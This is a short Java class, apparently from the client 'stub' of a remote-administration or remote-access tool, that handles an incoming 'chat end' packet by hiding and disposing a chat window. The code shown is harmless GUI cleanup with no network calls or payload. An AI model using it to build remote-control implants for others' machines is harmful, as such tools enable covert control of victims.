package com.redpois0n.stub.packets.incoming;

import com.redpois0n.stub.Connection;

public class Packet49ChatEnd extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.frameChat.setVisible(false);
		Connection.frameChat.dispose();
		Connection.frameChat = null;
	}

}
